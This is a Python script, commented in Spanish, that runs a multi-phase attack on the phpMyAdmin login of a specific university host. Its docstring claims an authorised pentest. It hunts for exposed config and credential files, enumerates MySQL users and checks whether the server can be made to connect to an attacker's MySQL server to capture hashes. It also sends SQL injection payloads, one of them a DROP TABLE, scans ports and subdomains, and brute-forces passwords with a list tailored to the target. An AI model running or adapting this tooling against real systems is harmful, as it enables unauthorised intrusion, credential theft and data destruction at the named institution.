#!/usr/bin/env python3
"""
phpMyAdmin Deep Recon - Multi-Vector Attack
============================================
Pentest autorizado UNS - orcl.uns.edu.pe
"""
import os, sys
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import requests
import urllib3
import re
import time
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()
TARGET = "https://orcl.uns.edu.pe"
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
SESSION.verify = False

RESULTS = []

def log(category, msg, level="INFO"):
    icon = {"INFO": "[*]", "FOUND": "[+]", "FAIL": "[-]", "VULN": "[!]", "WARN": "[?]"}
    print(f"  {icon.get(level, '[*]')} [{category}] {msg}")
    RESULTS.append((category, level, msg))

# ═══════════════════════════════════════════════════════════════
# 1. RECONOCIMIENTO DE ARCHIVOS EXPUESTOS
# ═══════════════════════════════════════════════════════════════
def recon_files():
    print("\n" + "="*65)
    print("  FASE 1: Reconocimiento de archivos expuestos")
    print("="*65)
    
    paths = [
        # Backups de configuracion
        "config.inc.php", "config.inc.php.bak", "config.inc.php.old",
        "config.inc.php.save", "config.inc.php.swp", "config.inc.php~",
        "config.inc.php.orig", "config.inc.php.dist", "config.inc.php.sample",
        "config.inc.php.default", "config.inc.php.backup",
        ".config.inc.php.swp",  # vim swap
        "config.inc.php.1", "config.inc.php.2",
        "config.inc.bak", "config.bak", "config.old",
        
        # Archivos de info/version
        "README", "README.md", "README.txt",
        "ChangeLog", "CHANGELOG", "changelog.txt",
        "LICENSE", "RELEASE-DATE-5.2.3",
        "composer.json", "composer.lock", "package.json",
        
        # PHP info
        "phpinfo.php", "info.php", "test.php", "i.php",
        "php_info.php", "phpversion.php", "pi.php",
        
        # Archivos de error/log
        "error_log", "error.log", "php_error.log",
        "debug.log", "access.log",
        ".htaccess", ".htpasswd",
        "web.config",
        
        # SQL dumps y backups
        "dump.sql", "backup.sql", "db.sql", "database.sql",
        "mysql.sql", "data.sql", "export.sql",
        "dump.sql.gz", "backup.sql.gz", "backup.tar.gz",
        "dump.sql.bak", "orcl.sql", "uns.sql",
        
        # Directorios de phpMyAdmin
        "setup/", "setup/index.php", "setup/config.php",
        "setup/frames/", "setup/lib/",
        "scripts/", "scripts/setup.php",
        "sql/", "sql/create_tables.sql",
        "tmp/", "tmp/", "upload/",
        "libraries/", "libraries/config.default.php",
        "doc/", "examples/",
        "themes/", "locale/",
        "vendor/", "vendor/autoload.php",
        
        # Archivos de entorno
        ".env", ".env.local", ".env.production",
        ".git/HEAD", ".git/config",
        ".gitignore", ".svn/entries",
        ".DS_Store", "Thumbs.db",
        
        # Otros CMS/apps en el mismo servidor
        "robots.txt", "sitemap.xml",
        "wp-login.php", "administrator/",
        "admin/", "panel/", "login/",
        "phpmyadmin/", "pma/", "myadmin/",
        "adminer.php", "adminer/",
        
        # Archivos que delatan configuracion
        "server-status", "server-info",
        ".well-known/security.txt",
        "crossdomain.xml",
        "favicon.ico",
    ]
    
    def check_path(path):
        try:
            url = f"{TARGET}/{path}"
            r = requests.get(url, verify=False, timeout=8, allow_redirects=False,
                           headers={"User-Agent": "Mozilla/5.0"})
            
            # Filtrar solo respuestas interesantes
            if r.status_code == 200:
                content_len = len(r.content)
                if content_len > 0:
                    # Verificar que no sea la pagina de login redirigida
                    if "phpMyAdmin" in r.text and "pma_username" in r.text and path not in ["", "/"]:
                        return None  # Es redireccion al login
                    
                    content_preview = r.text[:200].replace('\n', ' ').replace('\r', '')
                    return ("FOUND", path, r.status_code, content_len, content_preview)
            elif r.status_code in [301, 302, 303, 307, 308]:
                location = r.headers.get('Location', 'N/A')
                return ("REDIRECT", path, r.status_code, 0, f"-> {location}")
            elif r.status_code == 403:
                return ("FORBIDDEN", path, r.status_code, 0, "Acceso prohibido (existe pero protegido)")
            
            return None
        except:
            return None
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_path, p): p for p in paths}
        for future in as_completed(futures):
            result = future.result()
            if result:
                status, path, code, size, preview = result
                if status == "FOUND":
                    log("RECON", f"HTTP {code} | {size:>6} bytes | /{path} | {preview[:80]}", "FOUND")
                elif status == "FORBIDDEN":
                    log("RECON", f"HTTP 403 FORBIDDEN | /{path} (existe pero protegido)", "WARN")
                elif status == "REDIRECT":
                    log("RECON", f"HTTP {code} REDIRECT | /{path} {preview}", "WARN")


# ═══════════════════════════════════════════════════════════════
# 2. ENUMERACION DE USUARIOS MYSQL
# ═══════════════════════════════════════════════════════════════
def enumerate_users():
    print("\n" + "="*65)
    print("  FASE 2: Enumeracion de usuarios MySQL validos")
    print("="*65)
    
    # Basado en las diferencias de respuesta:
    # - "Rechazado" = phpMyAdmin bloquea (usuario/pass vacios o config)
    # - "Access denied" = MySQL responde = USUARIO PODRIA EXISTIR
    # En MySQL, "Access denied for user 'X'@'host'" aparece tanto si el user
    # existe como si no, PERO el mensaje puede variar sutilmente
    
    users_to_test = [
        "root", "admin", "mysql", "pma", "phpmyadmin", "test", "user",
        "oracle", "orcl", "uns", "sigea", "siigaa", "sistema", "campus",
        "webmaster", "soporte", "informatica", "dbadmin", "dba", "db",
        "guest", "administrator", "sa", "postgres", "backup", "replication",
        "readonly", "read_only", "monitor", "nagios", "zabbix", "grafana",
        "exporter", "prometheus", "app", "application", "web", "www",
        "api", "service", "deploy", "devops", "developer", "dev",
        "staging", "production", "prod", "oti", "ti", "helpdesk",
        "matricula", "registro", "alumno", "docente", "biblioteca",
        "rrhh", "contabilidad", "tesoreria", "logistica",
        "secretaria", "academico", "admision", "postgrado",
    ]
    
    valid_users = []
    response_map = {}
    
    def get_token():
        r = SESSION.get(TARGET, verify=False, timeout=10)
        tm = re.search(r'name="token"\s+value="([^"]+)"', r.text)
        sm = re.search(r'name="server"\s+value="(\d+)"', r.text)
        return (tm.group(1) if tm else None, sm.group(1) if sm else "1", r.cookies)
    
    for i, user in enumerate(users_to_test, 1):
        try:
            s = requests.Session()
            s.headers.update({"User-Agent": "Mozilla/5.0"})
            
            # Obtener token fresco
            r = s.get(TARGET, verify=False, timeout=10)
            tm = re.search(r'name="token"\s+value="([^"]+)"', r.text)
            sm = re.search(r'name="server"\s+value="(\d+)"', r.text)
            token = tm.group(1) if tm else None
            server = sm.group(1) if sm else "1"
            
            if not token:
                continue
            
            data = {"pma_username": user, "pma_password": "INVALID_ENUM_TEST_12345", 
                    "server": server, "token": token}
            
            start = time.time()
            r2 = s.post(f"{TARGET}/index.php?route=/", data=data, verify=False, 
                       timeout=10, allow_redirects=True)
            elapsed_ms = (time.time() - start) * 1000
            
            # Extraer el mensaje de error exacto
            error_match = re.search(r'(#\d+\s*-?\s*[^<]+)', r2.text)
            error_msg = error_match.group(1).strip() if error_match else "unknown"
            
            # Hash del body para detectar diferencias
            body_hash = hashlib.md5(r2.text.encode()).hexdigest()[:8]
            
            response_map[user] = {
                "error": error_msg, "hash": body_hash, 
                "time_ms": elapsed_ms, "status": r2.status_code,
                "body_len": len(r2.text)
            }
            
            # Si MySQL responde "Access denied", el usuario podria ser valido
            if "Access denied" in r2.text or "#1045" in r2.text:
                valid_users.append(user)
                log("ENUM", f"[{i}/{len(users_to_test)}] {user:20s} | {elapsed_ms:6.0f}ms | MySQL RESPONDE | {error_msg[:60]}", "FOUND")
            elif "Cannot log in" in r2.text:
                log("ENUM", f"[{i}/{len(users_to_test)}] {user:20s} | {elapsed_ms:6.0f}ms | Cannot connect", "FAIL")
            else:
                log("ENUM", f"[{i}/{len(users_to_test)}] {user:20s} | {elapsed_ms:6.0f}ms | Rejected by PMA", "FAIL")
            
            time.sleep(0.15)
        except Exception as e:
            log("ENUM", f"[{i}/{len(users_to_test)}] {user}: Error - {e}", "FAIL")
    
    # Analizar timing para detectar diferencias
    print("\n  --- Analisis de Timing ---")
    if response_map:
        times = [(u, d["time_ms"]) for u, d in response_map.items()]
        avg_time = sum(t for _, t in times) / len(times)
        outliers = [(u, t) for u, t in times if t > avg_time * 1.5]
        if outliers:
            for u, t in sorted(outliers, key=lambda x: -x[1]):
                log("TIMING", f"{u:20s} | {t:.0f}ms (avg: {avg_time:.0f}ms) - RESPUESTA LENTA", "WARN")
    
    return valid_users


# ═══════════════════════════════════════════════════════════════
# 3. CHECK AllowArbitraryServer
# ═══════════════════════════════════════════════════════════════
def check_arbitrary_server():
    print("\n" + "="*65)
    print("  FASE 3: Verificar AllowArbitraryServer")
    print("="*65)
    
    # Si AllowArbitraryServer esta habilitado, podemos hacer que phpMyAdmin
    # se conecte a NUESTRO servidor MySQL y capturar hashes
    
    r = SESSION.get(TARGET, verify=False, timeout=10)
    
    if 'name="pma_servername"' in r.text or 'pma_servername' in r.text:
        log("ARBITRARY", "AllowArbitraryServer HABILITADO - se puede conectar a servidor externo!", "VULN")
        log("ARBITRARY", "Vector: Levantar MySQL falso, capturar hash de autenticacion", "VULN")
        return True
    else:
        log("ARBITRARY", "AllowArbitraryServer no detectado en el formulario", "FAIL")
        
    # Intentar enviar pma_servername de todos modos
    tm = re.search(r'name="token"\s+value="([^"]+)"', r.text)
    if tm:
        data = {
            "pma_username": "root", "pma_password": "test",
            "pma_servername": "127.0.0.1",  # probar localhost primero
            "server": "1", "token": tm.group(1)
        }
        r2 = SESSION.post(f"{TARGET}/index.php?route=/", data=data, verify=False, timeout=10)
        if "pma_servername" in r2.text:
            log("ARBITRARY", "El servidor acepta pma_servername en POST!", "VULN")
            return True
    
    return False


# ═══════════════════════════════════════════════════════════════
# 4. INYECCION SQL EN LOGIN
# ═══════════════════════════════════════════════════════════════
def test_sqli_login():
    print("\n" + "="*65)
    print("  FASE 4: Test de inyeccion SQL en login")
    print("="*65)
    
    sqli_payloads = [
        ("root' OR '1'='1", "test"),
        ("root'--", ""),
        ("root' #", ""),
        ("root'/*", ""),
        ("' OR 1=1--", ""),
        ("' OR 1=1#", ""),
        ("admin'--", ""),
        ("root' UNION SELECT 1--", ""),
        ("root'; DROP TABLE IF EXISTS test_sqli_probe;--", ""),
    ]
    
    for user, pwd in sqli_payloads:
        try:
            s = requests.Session()
            s.headers.update({"User-Agent": "Mozilla/5.0"})
            r = s.get(TARGET, verify=False, timeout=10)
            tm = re.search(r'name="token"\s+value="([^"]+)"', r.text)
            sm = re.search(r'name="server"\s+value="(\d+)"', r.text)
            
            if not tm:
                continue
            
            data = {"pma_username": user, "pma_password": pwd,
                    "server": sm.group(1) if sm else "1", "token": tm.group(1)}
            r2 = s.post(f"{TARGET}/index.php?route=/", data=data, verify=False, timeout=10, allow_redirects=True)
            
            user_safe = user[:30]
            
            if any(x in r2.text for x in ["server_databases", "navigation.php", "Log out"]):
                log("SQLI", f"{user_safe} => ACCESO!! SQLi exitosa!", "VULN")
            elif "SQL syntax" in r2.text or "mysql_" in r2.text:
                log("SQLI", f"{user_safe} => Error SQL expuesto (posible inyeccion)", "WARN")
            elif "Access denied" in r2.text:
                log("SQLI", f"{user_safe} => Payload llega a MySQL (no filtra)", "WARN")
            else:
                log("SQLI", f"{user_safe} => Rechazado/filtrado", "FAIL")
            
            time.sleep(0.2)
        except Exception as e:
            log("SQLI", f"Error: {e}", "FAIL")


# ═══════════════════════════════════════════════════════════════
# 5. VERIFICAR HEADERS Y CONFIGURACION DEL SERVIDOR
# ═══════════════════════════════════════════════════════════════
def check_server_headers():
    print("\n" + "="*65)
    print("  FASE 5: Headers y configuracion del servidor")
    print("="*65)
    
    # HEAD request
    r = requests.head(TARGET, verify=False, timeout=10, 
                     headers={"User-Agent": "Mozilla/5.0"})
    
    log("HEADERS", f"Server: {r.headers.get('Server', 'N/A')}", "INFO")
    log("HEADERS", f"X-Powered-By: {r.headers.get('X-Powered-By', 'No expuesto')}", "INFO")
    log("HEADERS", f"X-Frame-Options: {r.headers.get('X-Frame-Options', 'AUSENTE')}", "INFO")
    log("HEADERS", f"CSP: {r.headers.get('Content-Security-Policy', 'AUSENTE')}", "INFO")
    log("HEADERS", f"HSTS: {r.headers.get('Strict-Transport-Security', 'AUSENTE')}", "INFO")
    log("HEADERS", f"X-Content-Type-Options: {r.headers.get('X-Content-Type-Options', 'AUSENTE')}", "INFO")
    
    # Verificar cookies
    for cookie in r.cookies:
        secure = "Secure" if cookie.secure else "NO Secure"
        httponly = "HttpOnly" if cookie.has_nonstandard_attr("HttpOnly") else "NO HttpOnly"
        log("COOKIES", f"{cookie.name} = ...{cookie.value[-10:]} | {secure} | {httponly}", "INFO")
    
    # OPTIONS request
    try:
        r2 = requests.options(TARGET, verify=False, timeout=10)
        allow = r2.headers.get("Allow", "N/A")
        log("HEADERS", f"Metodos permitidos (OPTIONS): {allow}", "INFO")
    except:
        pass
    
    # Probar TRACE
    try:
        r3 = requests.request("TRACE", TARGET, verify=False, timeout=10)
        if r3.status_code == 200 and "TRACE" in r3.text:
            log("HEADERS", "TRACE habilitado - posible XST (Cross-Site Tracing)", "VULN")
        else:
            log("HEADERS", f"TRACE: HTTP {r3.status_code}", "INFO")
    except:
        pass


# ═══════════════════════════════════════════════════════════════
# 6. PROBAR SUBDIRECTORIOS Y VIRTUAL HOSTS
# ═══════════════════════════════════════════════════════════════
def check_vhosts_and_ports():
    print("\n" + "="*65)
    print("  FASE 6: Otros puertos y servicios")
    print("="*65)
    
    # Puertos comunes
    ports = [80, 443, 8080, 8443, 3000, 3306, 5432, 8888, 9090, 8000, 4443, 
             8081, 8082, 9000, 9200, 27017, 6379, 11211]
    
    host = "orcl.uns.edu.pe"
    
    def check_port(port):
        for scheme in ["https", "http"]:
            try:
                url = f"{scheme}://{host}:{port}/"
                r = requests.get(url, verify=False, timeout=4, allow_redirects=False)
                title_match = re.search(r'<title>([^<]+)</title>', r.text, re.I)
                title = title_match.group(1) if title_match else "N/A"
                return (port, scheme, r.status_code, title, len(r.content))
            except:
                continue
        return None
    
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = {executor.submit(check_port, p): p for p in ports}
        for future in as_completed(futures):
            result = future.result()
            if result:
                port, scheme, code, title, size = result
                log("PORTS", f"{scheme}://{host}:{port}/ => HTTP {code} | {title} | {size} bytes", "FOUND")


# ═══════════════════════════════════════════════════════════════
# 7. BRUTE FORCE CON TOP PASSWORDS (rockyou subset)
# ═══════════════════════════════════════════════════════════════
def bruteforce_top_passwords(valid_users):
    print("\n" + "="*65)
    print("  FASE 7: Brute-force con top passwords")
    print("="*65)
    
    if not valid_users:
        valid_users = ["root"]
    
    # Top 100 passwords de rockyou + contexto universitario
    top_passwords = [
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "abc123", "football", "monkey",
        "letmein", "shadow", "master", "666666", "qwertyuiop",
        "123321", "mustang", "1234567890", "michael", "654321",
        "superman", "1qaz2wsx", "7777777", "121212", "000000",
        "qazwsx", "123qwe", "killer", "trustno1", "jordan",
        "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
        "soccer", "harley", "batman", "andrew", "tigger",
        "sunshine", "iloveyou", "2000", "charlie", "robert",
        "thomas", "hockey", "ranger", "daniel", "starwars",
        "klaster", "112233", "george", "computer", "michelle",
        "jessica", "pepper", "1111", "zxcvbn", "555555",
        "11111111", "131313", "freedom", "777777", "pass",
        "maggie", "159753", "aaaaaa", "ginger", "princess",
        "joshua", "cheese", "amanda", "summer", "love",
        "ashley", "nicole", "chelsea", "biteme", "matthew",
        "access", "yankees", "987654321", "dallas", "austin",
        "thunder", "taylor", "matrix", "mobilemail", "admin",
        # Contexto UNS / Peru
        "uns2024", "uns2025", "uns2026", "uns123", "unsadmin",
        "oracle123", "Oracle1", "mysql123", "Mysql123",
        "chimbote", "Chimbote", "chimbote2024", "santa",
        "universidad", "academico", "sistema123",
        "orcl123", "orcl2024", "database", "Database1",
        "P@ssw0rd", "P@ss1234", "Passw0rd!", "Admin123!",
        "Root123!", "Mysql1234", "Oracle12345",
        "uns.edu.pe", "orcl.uns", "admin2024",
    ]
    
    # Solo probar con los primeros 3 usuarios validos para no tardar mucho
    target_users = valid_users[:3]
    
    log("BRUTE", f"Usuarios objetivo: {', '.join(target_users)}", "INFO")
    log("BRUTE", f"Passwords a probar por usuario: {len(top_passwords)}", "INFO")
    
    total = len(target_users) * len(top_passwords)
    count = 0
    
    for user in target_users:
        for pwd in top_passwords:
            count += 1
            try:
                s = requests.Session()
                s.headers.update({"User-Agent": "Mozilla/5.0"})
                r = s.get(TARGET, verify=False, timeout=10)
                tm = re.search(r'name="token"\s+value="([^"]+)"', r.text)
                sm = re.search(r'name="server"\s+value="(\d+)"', r.text)
                
                if not tm:
                    continue
                
                data = {"pma_username": user, "pma_password": pwd,
                        "server": sm.group(1) if sm else "1", "token": tm.group(1)}
                r2 = s.post(f"{TARGET}/index.php?route=/", data=data, verify=False, 
                           timeout=10, allow_redirects=True)
                
                if any(x in r2.text for x in ["server_databases", "navigation.php", 
                       "db_structure", "Log out", "Cerrar"]):
                    log("BRUTE", f"[!!!] ACCESO: {user}:{pwd}", "VULN")
                    log("BRUTE", f"URL: {r2.url}", "VULN")
                    return (user, pwd)
                
                if count % 20 == 0:
                    log("BRUTE", f"Progreso: {count}/{total} ({count*100//total}%)", "INFO")
                
                time.sleep(0.15)
            except:
                continue
    
    log("BRUTE", f"Completado: {count} combinaciones probadas sin exito", "FAIL")
    return None


# ═══════════════════════════════════════════════════════════════
# 8. VERIFICAR OTROS SUBDOMINIOS
# ═══════════════════════════════════════════════════════════════
def check_related_subdomains():
    print("\n" + "="*65)
    print("  FASE 8: Subdominios relacionados")
    print("="*65)
    
    subdomains = [
        "db", "mysql", "database", "phpmyadmin", "pma", "sql",
        "admin", "panel", "backend", "api", "dev", "test",
        "staging", "orcl2", "oracle", "backup", "bk",
        "monitor", "grafana", "kibana", "elastic",
        "mail", "correo", "webmail", "ftp",
        "vpn", "ssh", "rdp", "remote",
        "intranet", "extranet", "portal",
        "sigea", "siigaa", "registro", "campus",
        "biblioteca", "aula", "virtual",
        "oti", "ti", "soporte",
    ]
    
    def check_subdomain(sub):
        host = f"{sub}.uns.edu.pe"
        for scheme in ["https", "http"]:
            try:
                url = f"{scheme}://{host}/"
                r = requests.get(url, verify=False, timeout=5, allow_redirects=False,
                               headers={"Host": host, "User-Agent": "Mozilla/5.0"})
                title_match = re.search(r'<title>([^<]+)</title>', r.text, re.I)
                title = title_match.group(1).strip() if title_match else "N/A"
                server = r.headers.get("Server", "N/A")
                return (sub, scheme, r.status_code, title, server)
            except:
                continue
        return None
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_subdomain, s): s for s in subdomains}
        for future in as_completed(futures):
            result = future.result()
            if result:
                sub, scheme, code, title, server = result
                log("SUBDOMAIN", f"{scheme}://{sub}.uns.edu.pe => HTTP {code} | {title} | {server}", "FOUND")


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
def main():
    print("=" * 65)
    print("  phpMyAdmin Deep Recon - Multi-Vector")
    print(f"  Target: {TARGET}")
    print(f"  Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 65)
    
    # Fase 1: Archivos expuestos
    recon_files()
    
    # Fase 2: Enumeracion de usuarios
    valid_users = enumerate_users()
    
    # Fase 3: AllowArbitraryServer
    check_arbitrary_server()
    
    # Fase 4: SQLi en login
    test_sqli_login()
    
    # Fase 5: Headers
    check_server_headers()
    
    # Fase 6: Puertos y servicios
    check_vhosts_and_ports()
    
    # Fase 7: Brute force extendido
    creds = bruteforce_top_passwords(valid_users)
    
    # Fase 8: Subdominios
    check_related_subdomains()
    
    # RESUMEN FINAL
    print("\n" + "=" * 65)
    print("  RESUMEN DE HALLAZGOS")
    print("=" * 65)
    
    vulns = [r for r in RESULTS if r[1] == "VULN"]
    warns = [r for r in RESULTS if r[1] == "WARN"]
    founds = [r for r in RESULTS if r[1] == "FOUND"]
    
    print(f"\n  Vulnerabilidades criticas: {len(vulns)}")
    for cat, _, msg in vulns:
        print(f"    [!] [{cat}] {msg}")
    
    print(f"\n  Advertencias: {len(warns)}")
    for cat, _, msg in warns:
        print(f"    [?] [{cat}] {msg}")
    
    print(f"\n  Hallazgos informativos: {len(founds)}")
    for cat, _, msg in founds:
        print(f"    [+] [{cat}] {msg}")
    
    if creds:
        print(f"\n  >>> CREDENCIALES ENCONTRADAS: {creds[0]}:{creds[1]}")
    
    # Guardar resultados
    results_file = r"c:\Users\Leguion T\Desktop\plan te pent\findings\deep_recon_results.txt"
    with open(results_file, "w", encoding="utf-8") as f:
        f.write(f"phpMyAdmin Deep Recon Results\n")
        f.write(f"Target: {TARGET}\n")
        f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for cat, level, msg in RESULTS:
            f.write(f"[{level}] [{cat}] {msg}\n")
    
    print(f"\n  Resultados completos en: {results_file}")
    print("=" * 65)


if __name__ == "__main__":
    main()
